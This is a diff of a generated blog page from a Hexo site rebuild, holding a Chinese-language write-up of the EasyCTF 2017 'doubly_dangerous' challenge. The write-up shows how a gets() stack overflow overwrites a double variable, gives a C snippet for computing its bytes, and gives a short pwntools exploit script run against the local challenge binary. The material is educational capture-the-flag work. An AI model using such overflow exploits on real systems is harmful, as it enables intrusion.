@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html  lang="zh">
-<head>
+<html lang="zh">
+<head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
 <title>EasyCTF 2017-doubly_dangerous writeup - Hvnt3r&#39;s Blog</title>
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
 
 
@@ -100,20 +100,15 @@
             
             <div class="navbar-start">
                 
-                <a class="navbar-item"
-                href="/">主页</a>
+                <a class="navbar-item" href="/">主页</a>
                 
-                <a class="navbar-item"
-                href="/archives/">归档</a>
+                <a class="navbar-item" href="/archives/">归档</a>
                 
-                <a class="navbar-item"
-                href="/categories/">分类</a>
+                <a class="navbar-item" href="/categories/">分类</a>
                 
-                <a class="navbar-item"
-                href="/tags/">标签</a>
+                <a class="navbar-item" href="/tags/">标签</a>
                 
-                <a class="navbar-item"
-                href="/about/">关于我</a>
+                <a class="navbar-item" href="/about/">关于我</a>
                 
             </div>
             
@@ -182,18 +177,18 @@
 <p>本程序是一个32位动态链接程序，并且开启了堆栈执行保护NX</p>
 <a id="more"></a>
 <p>main函数逻辑如下</p>
-<p><img src="https://i.loli.net/2018/10/15/5bc46a0c19147.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/10/15/5bc46a0c19147.png" alt></p>
 <p>很简单的一道溢出题，可以一题多解</p>
 <p><strong>解法一</strong></p>
 <p>需要将<code>v5</code>的值改为<code>11.28125</code>，唯一难点在于确定<code>11.28125</code>的<a href="https://math.stackexchange.com/questions/1791562/converting-0-1-to-binary-64-bit-double" target="_blank" rel="noopener">存储方式</a>，</p>
 <p>可以用如下代码打印出我们需要的数据(由于系统环境的差异，此代码运行的结果可能不正确)：</p>
 <figure class="highlight c hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">	<span class="hljs-keyword">double</span> x = <span class="hljs-number">11.28125</span>;<span class="hljs-comment">//更改为我们要修改的数值</span></span><br><span class="line">	<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> n = *(<span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>*)&amp;x;</span><br><span class="line">	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%llX"</span>,n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>还有一种方式是直接看汇编代码：</p>
-<p><img src="https://i.loli.net/2018/10/15/5bc47c981cdfd.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/10/15/5bc47c981cdfd.png" alt></p>
 <p>gets()函数之后程序会比较<code>ebp-0xC</code>和<code>0x804876C</code>的值是否相等</p>
-<p><img src="https://i.loli.net/2018/10/15/5bc47dc8b5518.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/10/15/5bc47dc8b5518.png" alt></p>
 <p>查看十六进制的数值</p>
-<p><img src="https://i.loli.net/2018/10/15/5bc47e17b54ef.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/10/15/5bc47e17b54ef.png" alt></p>
 <p>从而得到我们要的数据<code>0x00803441</code>，但是系统采用的是大端序因而这个值为<code>0x41348000</code></p>
 <p>因为之前写的文章里又不少详细的介绍比如<a href="https://hvnt3r.top/2018/10/2018%E6%8A%A4%E7%BD%91%E6%9D%AFPWN%E9%A2%98%E8%A7%A3/">这个</a>，这里就直接放脚本了：</p>
 <figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#!/usr/bin/python</span></span><br><span class="line"><span class="hljs-comment">#coding:utf-8</span></span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line">p=process(<span class="hljs-string">"./doubly_dangerous"</span>)</span><br><span class="line">payload=<span class="hljs-string">""</span></span><br><span class="line">payload+=<span class="hljs-string">"A"</span>*<span class="hljs-number">64</span>+p32(<span class="hljs-number">0x41348000</span>)</span><br><span class="line">p.recvuntil(<span class="hljs-string">"\n"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="hljs-keyword">print</span> p.recv()</span><br></pre></td></tr></table></figure>
@@ -376,36 +371,31 @@
         
         <div class="level is-mobile">
             
-            <a class="level-item button is-white is-marginless" target="_blank"
-                title="Github" href="https://github.com/Hvnt3r">
+            <a class="level-item button is-white is-marginless" target="_blank" title="Github" href="https://github.com/Hvnt3r">
                 
                 <i class="fab fa-github"></i>
                 
             </a>
             
-            <a class="level-item button is-white is-marginless" target="_blank"
-                title="Facebook" href="https://facebook.com">
+            <a class="level-item button is-white is-marginless" target="_blank" title="Facebook" href="https://facebook.com">
                 
                 <i class="fab fa-facebook"></i>
                 
             </a>
             
-            <a class="level-item button is-white is-marginless" target="_blank"
-                title="Twitter" href="https://twitter.com">
+            <a class="level-item button is-white is-marginless" target="_blank" title="Twitter" href="https://twitter.com">
                 
                 <i class="fab fa-twitter"></i>
                 
             </a>
             
-            <a class="level-item button is-white is-marginless" target="_blank"
-                title="Dribbble" href="https://dribbble.com">
+            <a class="level-item button is-white is-marginless" target="_blank" title="Dribbble" href="https://dribbble.com">
                 
                 <i class="fab fa-dribbble"></i>
                 
             </a>
             
-            <a class="level-item button is-white is-marginless" target="_blank"
-                title="RSS" href="https://hvnt3r.top/atom.xml">
+            <a class="level-item button is-white is-marginless" target="_blank" title="RSS" href="https://hvnt3r.top/atom.xml">
                 
                 <i class="fas fa-rss"></i>
                 
@@ -2310,8 +2300,7 @@
                 </a>
                 <p class="is-size-7">
                 &copy; 2019 Hvnt3r&nbsp;
-                Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & <a
-                        href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>
+                Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>
                 
                 </p>
             </div>
@@ -2447,7 +2436,7 @@ document.addEventListener('DOMContentLoaded', function () {
     <div class="searchbox ins-search">
     <div class="searchbox-container ins-search-container">
         <div class="searchbox-input-wrapper">
-            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么..." />
+            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么...">
             <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
         </div>
         <div class="searchbox-result-wrapper ins-section-wrapper">
@@ -2474,5 +2463,5 @@ document.addEventListener('DOMContentLoaded', function () {
 <link rel="stylesheet" href="/css/search.css">
 <link rel="stylesheet" href="/css/insight.css">
     
-<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":100,"height":200},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-widget-model-koharu"},"display":{"position":"right","width":100,"height":200},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 </html>
